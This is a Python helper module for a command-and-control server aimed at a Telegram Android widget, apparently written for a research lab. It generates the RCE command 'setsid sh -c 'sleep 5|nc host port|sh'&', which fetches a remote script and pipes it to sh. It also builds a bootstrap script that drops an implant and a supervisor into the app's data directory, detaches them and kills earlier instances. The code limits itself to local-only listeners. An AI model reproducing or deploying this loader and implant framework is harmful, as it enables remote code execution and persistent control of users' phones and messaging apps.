#!/usr/bin/env python3
"""Shared helpers for the Telegram widget C2 (stdlib only).

Everything here is deliberately local-only:
  * bind addresses must be loopback or RFC1918/link-local (LAN opt-in),
  * peers must come from a private/loopback source address,
  * the server never opens an outbound connection.

No third-party packages, no network access beyond the listener sockets.
"""
from __future__ import annotations

import base64
import hashlib
import ipaddress
import os
from typing import Optional

VERSION = "1.0"
PROTO_VERSION = 1
DEFAULT_CONTROL_PORT = 4444
DEFAULT_LOADER_PORT = 5555
DEFAULT_APP = "org.telegram.messenger.beta"
DEFAULT_DEVICE_DIR = "/data/user/0/%s/files/.c2" % DEFAULT_APP
MAX_LINE = 8 * 1024 * 1024          # hard cap on one protocol line
MAX_EXEC_OUT = 1024 * 1024          # default per-stream cap (implant enforces)
MAX_PUT = 262144                    # single 'put' message cap (b64 bytes)
MAX_GET = 64 * 1024 * 1024          # server-side download cap

HERE = os.path.dirname(os.path.abspath(__file__))
C2_ROOT = os.path.dirname(HERE)
IMPLANT_PATH = os.path.join(C2_ROOT, "implant", "implant.sh")
SUPERVISOR_PATH = os.path.join(C2_ROOT, "implant", "supervisor.sh")


class SafeBindError(ValueError):
    pass


def parse_ip(host: str) -> ipaddress._BaseAddress:
    try:
        return ipaddress.ip_address(host)
    except ValueError:
        raise SafeBindError(
            "bind host must be a literal IP address (got %r); "
            "hostnames/DNS are not allowed" % host
        )


def check_bind_host(host: str, allow_lan: bool) -> ipaddress._BaseAddress:
    """Validate a listener address. Loopback is always fine; private/LAN
    addresses require --allow-lan; anything routable is refused."""
    ip = parse_ip(host)
    if ip.is_unspecified:
        raise SafeBindError(
            "refusing 0.0.0.0/:: (exposes every interface); "
            "bind 127.0.0.1 or the exact LAN address with --allow-lan"
        )
    if ip.is_loopback:
        return ip
    if ip.is_private or ip.is_link_local:
        if not allow_lan:
            raise SafeBindError(
                "%s is a LAN address; re-run with --allow-lan to bind it "
                "(and keep the port on the trusted LAN only)" % host
            )
        return ip
    raise SafeBindError(
        "%s is not a private/loopback address; this C2 is local-only and "
        "will not bind a public interface" % host
    )


def check_peer(peer_ip: str) -> bool:
    """Accept only private/loopback/link-local peers (defence in depth)."""
    try:
        ip = ipaddress.ip_address(peer_ip)
    except ValueError:
        return False
    if ip.version == 6 and ip.ipv4_mapped is not None:
        ip = ip.ipv4_mapped
    return bool(ip.is_loopback or ip.is_private or ip.is_link_local)


def b64e(data) -> str:
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode("ascii")


def b64d(text: str) -> bytes:
    return base64.b64decode(text.encode("ascii"), validate=False)


def check_token(token: str) -> None:
    """The token is embedded in a shell script and JSON hello; keep it simple."""
    if token and any(c not in
                     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-"
                     for c in token):
        raise ValueError("token must be alphanumeric plus . _ -")


def read_text(path: str) -> str:
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


def _check_delimiter(src: str, delim: str) -> None:
    for line in src.splitlines():
        if line.strip() == delim:
            raise RuntimeError("implant source contains bootstrap delimiter %r" % delim)


def render_bootstrap(host: str, port: int, token: str = "", implant_id: str = "",
                     mock: bool = False, mock_dir: Optional[str] = None,
                     diag: bool = False, diag_xtrace: bool = False) -> str:
    """Build the script served on the loader port.

    The script is fed to `sh` through a pipe (the short RCE command), writes
    the implant and supervisor with quoted heredocs, then detaches the
    supervisor.  It contains no network client: the implant connects out.

    Re-arm safety: every widget engine that boots runs this script.  The
    script therefore takes a bootstrap lock, and a build sentinel makes all
    later fetches of the same build exit with C2_ALREADY_RUNNING instead of
    killing the live supervisor/implant (the 01:35 storm).

    With diag=True it instead runs `C2_DIAG=1 implant.sh` synchronously and
    writes $D/diag.out; it never kills or starts the full C2.
    """
    check_token(token)
    implant = read_text(IMPLANT_PATH)
    supervisor = read_text(SUPERVISOR_PATH)

    build = hashlib.sha256(
        (implant + "\n" + supervisor + "\n" + host + "\n" + str(port)
         + "\n" + token + "\n" + implant_id).encode("utf-8")).hexdigest()[:16]

    implant = (implant
               .replace("__C2_HOST__", host)
               .replace("__C2_PORT__", str(port))
               .replace("__C2_TOKEN__", token)
               .replace("__C2_ID__", implant_id)
               .replace("__C2_BUILD__", build))
    _check_delimiter(implant, "__C2_IMPLANT_EOF__")
    _check_delimiter(supervisor, "__C2_SUPERVISOR_EOF__")

    if mock:
        if not mock_dir:
            raise ValueError("mock bootstrap needs a directory")
        d = mock_dir
        mock_flag = "1"
    else:
        d = DEFAULT_DEVICE_DIR
        mock_flag = "0"

    # No command in this script reads stdin: sh is executing the script from
    # the pipe, so an unredirected `cat`/`read` would steal script bytes.
    # The diag invocation is explicitly </dev/null for the same reason.
    script = """#!/system/bin/sh
# Telegram widget C2 bootstrap -- generated, local-only.
# Served over the loader port and piped to sh by the RCE command.
C2_MOCK="@@C2_MOCK@@"
C2_BUILD="@@C2_BUILD@@"
C2_DIAG_MODE="@@C2_DIAG@@"
D="@@C2_DIR@@"
APP="@@C2_APP@@"
mkdir -p "$D" 2>/dev/null || exit 1

# ---- one bootstrap at a time (30 widget engines = 30 fetches) ----
BOOT_LOCK="$D/boot.lock"
if ! mkdir "$BOOT_LOCK" 2>/dev/null; then
    bp=$(cut -d' ' -f1 "$BOOT_LOCK/pid" 2>/dev/null)
    bt=$(cut -d' ' -f2 "$BOOT_LOCK/pid" 2>/dev/null)
    case "$bt" in ''|*[!0-9]*) bt=0 ;; esac
    age=$(( $(date +%s) - bt ))
    if [ -n "$bp" ] && kill -0 "$bp" 2>/dev/null && [ "$age" -lt 60 ]; then
        echo "C2_BOOTSTRAP_BUSY pid=$bp age=${age}s"
        exit 0
    fi
    rm -rf "$BOOT_LOCK" 2>/dev/null
    mkdir "$BOOT_LOCK" 2>/dev/null || exit 1
fi
printf '%s %s\\n' "$$" "$(date +%s)" > "$BOOT_LOCK/pid"
trap 'rm -rf "$BOOT_LOCK" 2>/dev/null' 0

if [ "$C2_DIAG_MODE" = "1" ]; then
    # diagnostic mode never touches a running full C2
    if [ -f "$D/diag.stamp" ] && [ "$(cat "$D/diag.stamp" 2>/dev/null)" = "$C2_BUILD" ]; then
        echo "C2_DIAG_ALREADY_RAN build=$C2_BUILD"
        exit 0
    fi
else
    # same build + live supervisor => the storm is a no-op
    sp0=$(cat "$D/sup.pid" 2>/dev/null)
    [ -n "$sp0" ] || sp0=$(cat "$D/sup.lock/pid" 2>/dev/null)
    if [ -f "$D/build" ] && [ "$(cat "$D/build" 2>/dev/null)" = "$C2_BUILD" ] \\
       && [ -n "$sp0" ] && kill -0 "$sp0" 2>/dev/null; then
        echo "C2_ALREADY_RUNNING pid=$sp0 build=$C2_BUILD"
        exit 0
    fi
fi

# ---- replace an old or dead instance (full mode only) ----
if [ "$C2_DIAG_MODE" != "1" ]; then
    sp=$(cat "$D/sup.pid" 2>/dev/null)
    ip=$(cat "$D/implant.pid" 2>/dev/null)
    [ -n "$sp" ] && kill "$sp" 2>/dev/null
    [ -n "$ip" ] && kill "$ip" 2>/dev/null
    # The supervisor handles TERM after its current sleep; give it time.
    i=0
    while [ "$i" -lt 50 ]; do
        a=0
        [ -n "$sp" ] && kill -0 "$sp" 2>/dev/null && a=1
        [ -n "$ip" ] && kill -0 "$ip" 2>/dev/null && a=1
        [ "$a" -eq 0 ] && break
        sleep 0.1
        i=$((i + 1))
    done
    [ -n "$sp" ] && kill -9 "$sp" 2>/dev/null
    [ -n "$ip" ] && kill -9 "$ip" 2>/dev/null
    # A storm may have left untracked processes behind.  Sweep /proc for this
    # state dir's scripts (own-UID cmdlines are readable; others are skipped
    # because the read yields nothing).
    for c in /proc/[0-9]*/cmdline; do
        p=${c#/proc/}
        p=${p%/cmdline}
        case "$p" in ''|*[!0-9]*) continue ;; esac
        [ -r "$c" ] || continue
        cl=$(tr '\\0' ' ' < "$c" 2>/dev/null)
        case "$cl" in
            *"$D/implant.sh"*|*"$D/supervisor.sh"*) kill -9 "$p" 2>/dev/null ;;
        esac
    done
    # do not let a dying supervisor's lock reject the new one
    rm -rf "$D/sup.lock" "$D/implant.lock" 2>/dev/null
    rm -f "$D/stop" "$D/restart" 2>/dev/null
fi

cat > "$D/implant.sh" <<'__C2_IMPLANT_EOF__'
@@C2_IMPLANT@@
__C2_IMPLANT_EOF__
cat > "$D/supervisor.sh" <<'__C2_SUPERVISOR_EOF__'
@@C2_SUPERVISOR@@
__C2_SUPERVISOR_EOF__
chmod 700 "$D/implant.sh" "$D/supervisor.sh" 2>/dev/null
SH=/system/bin/sh; [ -x "$SH" ] || SH=sh
SETSID=/system/bin/setsid; [ -x "$SETSID" ] || SETSID=setsid

if [ "$C2_DIAG_MODE" = "1" ]; then
    # Own session: a teardown signal to the bootstrap's process group must
    # not take the diag with it (device 02:18: the sh vanished at cn-begin,
    # the app and the bootstrap's boot.lock were left behind).
    C2_DIAG=1 C2_DIR="$D" C2_MOCK="$C2_MOCK" C2_SH="$SH" C2_BUILD="$C2_BUILD" \\
        C2_DIAG_X="@@C2_DIAG_X@@" \\
        "$SETSID" "$SH" "$D/implant.sh" </dev/null >"$D/diag.out" 2>&1 &
    DPID=$!
    # Bounded: if the diag wedges in a FIFO open, the trap closes its
    # children; a second kill covers a wedged syscall.  A cgroup freeze
    # freezes this watchdog too, so the trace is the tie-breaker.
    ( sleep 25
      printf 'DIAG_WATCHDOG stage=kill\\n' >> "$D/diag.out"
      printf '%s DIAG_WATCHDOG stage=kill\\n' "$(date +%s)" >> "$D/diag.trace" 2>/dev/null
      kill "$DPID" 2>/dev/null
      sleep 2
      kill -9 "$DPID" 2>/dev/null
    ) &
    WD=$!
    wait "$DPID"
    rc=$?
    kill "$WD" 2>/dev/null
    if [ "$rc" -eq 0 ]; then
        printf '%s\\n' "$C2_BUILD" > "$D/diag.stamp"
    fi
    echo "DIAG_DONE rc=$rc build=$C2_BUILD"
    exit "$rc"
fi

C2_DIR="$D" C2_MOCK="$C2_MOCK" C2_SH="$SH" C2_BUILD="$C2_BUILD" \\
    $SETSID "$SH" "$D/supervisor.sh" </dev/null >>"$D/sup.out" 2>&1 &
# Write the sentinel only once the supervisor has published its pid, so a
# fetch that races this one sees either the boot lock or a live supervisor.
i=0
while [ ! -s "$D/sup.pid" ] && [ "$i" -lt 20 ]; do
    sleep 0.1
    i=$((i + 1))
done
printf '%s\\n' "$C2_BUILD" > "$D/build"
echo "BOOT_OK $D build=$C2_BUILD"
"""
    script = (script
              .replace("@@C2_MOCK@@", mock_flag)
              .replace("@@C2_BUILD@@", build)
              .replace("@@C2_DIAG@@", "1" if diag else "0")
              .replace("@@C2_DIAG_X@@", "1" if diag_xtrace else "0")
              .replace("@@C2_DIR@@", d)
              .replace("@@C2_APP@@", DEFAULT_APP)
              .replace("@@C2_IMPLANT@@", implant.rstrip("\n"))
              .replace("@@C2_SUPERVISOR@@", supervisor.rstrip("\n")))
    # The loader pipe and the 2 s gate: Linux/Android pipe buffers are 64 KiB.
    # Keeping the script below 56 KiB guarantees the whole bootstrap is
    # buffered before the sleep releases toybox nc's stdin.
    if len(script.encode("utf-8")) > 56 * 1024:
        raise RuntimeError(
            "bootstrap is %d bytes; the 64 KiB pipe + sleep gate needs < 56 KiB. "
            "Raise the sleep in bootstrap_command or shrink the implant."
            % len(script.encode("utf-8")))
    return script


# The smallest form that fits the widget's 50-byte system() command field.
# Bare `nc`/`sleep`/`setsid` are resolved through the app process PATH
# (/system/bin is present); on the Sony /system/bin/nc and /system/bin/sleep
# are toybox symlinks (verified on-device).  setsid + `&` make system()
# return before the app crashes; `sleep` holds toybox nc's stdin open.
SHORT_BOOTSTRAP = "setsid sh -c 'sleep 5|nc %s %d|sh'&"
SHORT_BOOTSTRAP_MAX = 50


def bootstrap_command(host: str, port: int, mock: bool = False,
                      short: bool = False) -> str:
    """The exact short string to hand to system() in the widget exploit.

    short=False keeps the 80-char absolute-path form (toybox nc); short=True
    is the <=50-byte form used by the 50-byte command buffer in the
    c2560s_c2 widget (bare PATH applets, verified on the Sony).

    toybox nc exits as soon as stdin hits EOF, so `sleep` holds the pipe open
    long enough to deliver the script.  setsid detaches the whole pipeline, so
    system() returns immediately and the bootstrap survives the app crash.
    """
    if short:
        cmd = SHORT_BOOTSTRAP % (host, port)
        if len(cmd) > SHORT_BOOTSTRAP_MAX:
            raise ValueError(
                "short bootstrap is %d chars (limit %d): use a shorter "
                "host/port or the absolute-path form"
                % (len(cmd), SHORT_BOOTSTRAP_MAX))
        return cmd
    if mock:
        return ("setsid sh -c 'sleep 2|nc %s %d|sh' &" % (host, port))
    return ("setsid sh -c '/system/bin/sleep 2|/system/bin/toybox nc %s %d|sh' &"
            % (host, port))


def default_implant_id(uid: str = "", device: str = "") -> str:
    if uid and device:
        safe = "".join(c if c.isalnum() or c in "_.-" else "_" for c in device)
        return "tg-%s-%s" % (uid, safe)
    return "tg-implant"


def split_hostport(value: str) -> tuple:
    """'host:port' -> (host, port); IPv6 must be bracketed."""
    if value.startswith("["):
        host, _, rest = value[1:].partition("]")
        if not rest.startswith(":"):
            raise ValueError("bad address %r" % value)
        return host, int(rest[1:])
    host, sep, port = value.rpartition(":")
    if not sep:
        raise ValueError("expected host:port")
    return host, int(port)
